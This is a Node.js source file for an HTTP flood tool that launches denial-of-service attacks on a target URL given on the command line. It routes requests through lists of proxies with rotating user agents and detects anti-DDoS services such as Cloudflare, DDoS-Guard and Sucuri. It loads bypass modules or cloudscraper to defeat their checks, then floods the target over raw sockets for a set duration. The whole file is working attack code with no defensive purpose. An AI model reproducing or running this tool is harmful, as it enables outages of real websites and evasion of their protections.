const net = require('net'),
    request = require('request'),
    os = require('os'),
    url = require('url'),
    fs = require('fs'),
    X = require('./x');

let ignoreNames = ['RequestError', 'StatusCodeError'];
let ignoreCodes = ['ECONNRESET', 'ERR_ASSERTION'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    console.warn(e);
});
process.on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    console.warn(e);
});
process.on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
    console.warn(e)
});

require('events').EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

process.on('SIGHUP', () => {
    return 1;
});

process.on('SIGCHILD', () => {
    return 1;
});

const numCPUs = os.cpus().length;

let args = process.argv.slice(2);

X._ = {
    bypass: ['ddos-guard', 'cloudflare', 'blazingfast'],
    firewall: false,
    user_agents: [...new Set(fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n'))],
    method: "GET",
    proxies: [...new Set(fs.readFileSync('cc.txt').toString().match(/\S+/g))],
    bypass_src: './bypass/',
    referers: ['https://google.com/', 'https://steamcommunity.com/', 'https://instagram.com', 'https://discordapp.com/', 'htps://twitter.com', 'https://youtube.com', 'https://facebook.com', 'https://web.whatsapp.com', 'https://microsoft.com', 'https://minecraft.net', 'https://spotify.com', 'https://netflix.com', 'https://web.telegram.org', 'https://cloudflare.com', 'https://blockchain.com'],
    accept_language: [
        'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
        'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
        'en-US,en;q=0.5',
        'en-US,en;q=0.9',
        'de-CH;q=0.7',
        'da, en-gb;q=0.8, en;q=0.7',
        'cs;q=0.5'
    ]
}

const Browser = require('zombie');
X.last = {};
X.firewall = false;
X.firewalls = [];
X.running = false;
const cloudscraper = require('cloudscraper');
const {
    constants
} = require('crypto');

class WebAttack {
    constructor() {
        function AutoDetect() {
            if (X.running) return false;
            request({
                method: "GET",
                url: X._.address,
                gzip: true,
                followAllRedirects: true,
                jar: true,
                agentOptions: {
                    secureOptions: constants.SSL_OP_NO_TLSv1 | constants.SSL_OP_NO_TLSv1_1,
                    ciphers: constants.defaultCipherList + ':!ECDHE+SHA:!AES128-SHA'
                },
                timeout: 10e3,
                proxy: 'http://' + X._.proxies[~~[Math.random() * X._.proxies.length]],
                headers: {
                    'Connection': 'keep-alive',
                    'Cache-Control': 'max-age=0',
                    'Upgrade-Insecure-Requests': 1,
                    'User-Agent': X._.user_agents[~~[Math.random() * X._.user_agents.length]],
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*;q=0.8,application/signed-exchange;v=b3',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'en-US'
                }
            }, (err, res, body) => {
                if (X.running) return false;

                if (err || !res || !body || res.headers['proxy-connection'] || body.indexOf('Maximum number of open connections reached') !== -1 || body.indexOf('<title>ERROR: The requested URL could not be retrieved</title>') !== -1 || parseInt(res.headers['content-length']) < 30 || body.indexOf('<title>This is a SOCKS Proxy, Not An HTTP Proxy</title>') !== -1 || body.indexOf('<title>Tor is not an HTTP Proxy</title>') !== -1) {
                    return setImmediate(AutoDetect); // Proxy failed, or an error occured, retry.
                }

                if (res.headers.server == 'cloudflare') {
                    if (body.indexOf("DDoS protection by Cloudflare") !== -1 && body.indexOf("Checking your browser before accessing") !== -1 && res.headers.server == 'cloudflare' && body.indexOf('<title>Just a moment...</title>') !== -1) {
                        //Cloudflare UAM Detected:
                        X.firewall = ['cloudflare', 'uam'];
                    } else if (/Why do I have to complete a CAPTCHA/.test(body) && res.headers.server == 'cloudflare' && res.statusCode == 403) {
                        //Cloudflare Captcha Detected:
                        X.firewall = ['cloudflare', 'captcha'];
                    } else {
                        X.firewall = ['cloudflare', false]
                    }
                } else if (res.headers['server'] == 'Sucuri/Cloudproxy' || body.indexOf("{},u,c,U,r,i,l=0") !== -1 && res.headers['x-sucuri-id'] && body.startsWith('<html><title>You are being redirected...</title>')) {
                    X.firewall = ['sucuri', 'jschl', true];
                } else if (body.indexOf("<!DOCTYPE html><html><head><title>DDOS-GUARD</title>") !== -1) {
                    X.firewall = ['ddos-guard', '5sec'];
                    X.ratelimit = true;
                } else if (res.headers['set-cookie'] && res.headers['set-cookie'][0].startsWith('__ddg_=')) {
                    X.firewall = ['ddos-guard', 'proxy'];
                } else if (res.headers.server && res.headers['x-hw'] && res.headers.server == 'fbs' && res.headers['x-hw'].startsWith('1')) {
                    X.firewall = ['stackpath', false];
                } else if (res.statusCode == 200 && ['nginx', 'openresty'].indexOf(res.headers.server) !== -1 && res.headers['set-cookie']) {
                    if (res.headers['set-cookie'][0].startsWith('rcksid=')) {
                        X.firewall = ['blazingfast', '5sec'];
                    } else if (res.headers['set-cookie'][0].startsWith('BlazingWebCookie=')) {
                        X.firewall = ['blazingfast', '5sec2'];
                    }
                } else if (body.indexOf(';document.cookie="CyberDDoS_') !== -1) {
                    if (body.indexOf('<div w3-include-html="/5s.html"></div>') !== -1) {
                        X.firewall = ['cyberddos', '5sec'];
                    } else {
                        X.firewall = ['cyberddos', 'silent'];
                    }
                } else if (res.headers.server && res.headers.server.startsWith('nginx') && res.statusCode == 589 && res.headers['set-cookie'] && res.headers['set-cookie'][0].startsWith('nooder_t=')) {
                    X.firewall = ['nooder', 'cookie'];
                } else if (res.statusCode == 200 && body.startsWith('<html><body><script>setTimeout(eval(function(p,a,c,k,e,d){e=function(c){') && body.endsWith('Please enable JavaScript and Cookies in your browser.</p></noscript></body></html>')) {
                    X.firewall = ['ovh', 'js'];
                } else if (res.statusCode == 200 && body.indexOf('function setCookie() {document.cookie = "PipeGuard=') !== -1 && body.startsWith('<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>Human Verification</title>')) {
                    X.firewall = ['pipeguard', 'SetCookie'];
                }
                X.firewalls.push(X.firewall);
                X.last.body = body;
                X.last.res = res;
            });
        }

        let tryrun = setInterval(() => {
            X.running ? clearInterval(tryrun) : setImmediate(AutoDetect);
            if (X.firewalls.length >= 10) {
                clearInterval(tryrun);
                for (var i = 0; i < X.firewalls.length; i++) {
                    if (Array.isArray(X.firewalls[i])) {
                        switch (X.firewall[0]) {
                            case 'cloudflare':
                                X.firewall[1] = ((X.firewalls[i][1] !== 'captcha' && X.firewall[1] == 'captcha') ? X.firewalls[i][1] : X.firewall[1])
                                break;
                            case 'ddos-guard':
                                X.firewall[1] = ((X.firewalls[i][1] !== 'proxy' && X.firewall[1] == 'proxy') ? X.firewalls[i][1] : X.firewall[1])
                                break;
                        }
                        if (X.firewall == false) X.firewall = X.firewalls[i];
                    }
                }
                if (!X.running) {
                    if (X.firewall !== false && X.firewalls.length !== 0) {
                        console.log(X._.address, X.firewall);
                    } else {
                        console.log(X.last.body.trim(), X.last.res.headers, false);
                    }
                    X.running ? false : X.attack.start();
                }
            }
        });
        setTimeout(() => {
            console.log('Attack finished');
            process.exit(15);
        }, X._.expire - Date.now());
    }

    require_bypass(bypassModule) {
        X._.BYPASS = require(X._.bypass_src + bypassModule + '.js');
    }

    start() {
        X.running = true;
        X._.firewall = X.firewall || false;
        X._.ratelimit = X.ratelimit;

        if (X._.firewall !== false) {
            if (!X._.BYPASS) {
                if (X._.bypass.includes(X._.firewall[0])) {
                    this.require_bypass(X._.firewall[0]);
                } else {
                    this.require_bypass('browser_engine');
                }
                console.log(X._.BYPASS);
            }

            if (X._.firewall[1] == false) {
                X._.proxies.forEach(p => {
                    var dobj = {
                        proxy: p,
                        uagent: X._.user_agents[~~(Math.random() * X._.user_agents.length)]
                    };

                    cloudscraper.get({
                        url: X._.address,
                        proxy: 'http://' + p,
                        jar: true,
                        followAllRedirects: true,
                        headers: {
                            'User-Agent': dobj.uagent
                        }
                    }, (err, res, body) => {
                        if (err) return false;
                        if (res.request.headers.cookie) {
                            dobj.cookie = res.request.headers.cookie;
                        }
                        X.attack.init(dobj);
                    });
                })
                return;
            }

            X._.proxies.forEach(p => {
                let uagent = X._.user_agents[~~(Math.random() * X._.user_agents.length)];
                X._.BYPASS(p, uagent, cookie => {
                    var dobj = {
                        proxy: p,
                        uagent
                    }
                    if (cookie) {
                        dobj.cookie = cookie
                    }
                    X.attack.init(dobj);
                });
            });
        } else {
            X._.proxies.forEach(p => {
                var dobj = {
                    proxy: p,
                    uagent: X._.user_agents[~~(Math.random() * X._.user_agents.length)]
                };
                request.get({
                    url: X._.address,
                    proxy: 'http://' + p,
                    headers: {
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': dobj.uagent,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9'
                    }
                }, (err, res, body) => {
                    if (err) return false;
                    if (res.request.headers.cookie) {
                        dobj.cookie = res.request.headers.cookie;
                    }
                    X.attack.init(dobj);
                });
            })
        }
    }

    randomReferer() {
        return X._.referers[Math.random() * X._.referers.length]
    }

    initreq(props) {
        props.headers = {
            'Accept': X._.accept || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': X._.acceptLang || 'en-US;q=0.8',
            'Cache-Control': X._.cacheControl || 'no-cache',
            'pragma': X._.pragma || 'no-cache',
            'Referer': X._.referer || this.randomReferer(),
            'Upgrade-Insecure-Requests': 1,
            'Connection': 'Keep-Alive',
            'User-Agent': props.uagent,
            'Cookie': props.cookie || undefined
        }

        this.sendrequest(props);
    }

    init(props) {
        //this.initreq(props);
        props.proxy = props.proxy.split(':');
        this.rawreq(props);
    }

    sendrequest(props) {
        request({
            method: X._.method,
            url: X._.address,
            headers: props.headers,
            gzip: true,
            timeout: 50e3,
            jar: true,
            proxy: 'http://' + props.proxy,
            insecure: true,
            followAllRedirects: true
        }, (err) => {
            if (!err) {
                this.sendrequest(props);
            }
        });
    }

    rawreq(props) {
        let gerev = net.connect({
            host: props.proxy[0],
            port: props.proxy[1]
        }, () => {
            for (let j = 0; j < 10; j++) {
                gerev.req();
            }
        });

        gerev.req = () => {
            gerev.destroyed ? gerev.destroy() : gerev.write(`${X._.method || props.method || "GET"} ${X._.address} HTTP/1.1\r\nHost: ${X._.parsed.host}\r\nConnection: Keep-Alive\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate, br${props.cookie ? ('\r\nCookie: ' + props.cookie) : ''}\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nUser-Agent: ${props.uagent}\r\n\r\n${X._.body || props.body || ""}`);
        }

        gerev.setTimeout(160e3);

        gerev.started = false;

        gerev.on('data', () => {
            gerev.req();
            gerev.started ? false : this.rawreq(props), gerev.started = true;
        });

        gerev.once('disconnect', () => {
            gerev.started ? gerev.end() : this.rawreq(props), gerev.started = true;
            return;
        });

        gerev.once('error', () => {
            gerev.started = true;
            gerev.end();
            return false;
        })

        gerev.on('timeout', () => {
            gerev.started ? gerev.end() : this.rawreq(props), gerev.started = true, gerev.end();
            return;
        });
    }
}

var complete = args[0];
var parsed = url.parse(complete);
let serpicogay =  Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
var target = complete.replace("%RAND%", serpicogay);

X._.address = target;
X._.duration = args[1];
X._.parsed = url.parse(X._.address);
X._.method = args[2].method || "GET";
X._.expire = (X._.duration * 1e3) + Date.now();
X._.options = args[3] ? JSON.parse(fs.readFileSync(args[3], 'utf-8')) : false;
X.attack = new WebAttack();